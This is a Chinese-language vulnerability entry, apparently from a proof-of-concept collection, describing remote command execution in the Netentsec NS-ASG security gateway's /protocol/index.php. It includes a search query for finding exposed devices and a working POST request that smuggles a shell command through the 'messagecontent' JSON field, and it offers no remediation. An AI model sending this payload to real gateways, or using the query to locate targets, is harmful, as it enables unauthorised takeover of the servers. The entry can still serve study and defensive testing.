# 网康 NS-ASG安全网关 index.php 远程命令执行漏洞

## 漏洞描述

网康 NS-ASG安全网关 index.php文件存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以获取服务器权限

## 漏洞影响

<a-checkbox checked>网康 NS-ASG安全网关</a-checkbox></br>

## 网络测绘

<a-checkbox checked> title=="网康 NS-ASG 应用安全网关"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1660545594828-6a216122-73d2-4dd4-91d3-8f91dfd9d903-20230311202627447.png)

存在漏洞的文件为 /protocol/index.php ，通过文件读取可以获取到源码

![img](../../../.vuepress/public/img/1660545902675-0586f8f2-d3c8-4dbe-816e-821013ba8e83-20230311202624155.png)

![img](../../../.vuepress/public/img/1660546891442-cd318722-bd7d-474f-8e6b-17dfb7ded9de-20230311202624159.png)

通过构造请求包进行命令拼接漏洞执行命令

```php
POST /protocol/index.php
  
jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
```

![img](../../../.vuepress/public/img/1660547107247-ca9ae305-a265-4ad1-978b-a344384d8c9c-20230311202623936.png)

![img](../../../.vuepress/public/img/1660547143958-774e5dad-e5f1-4277-bb12-36653c843adf-20230311202623607.png)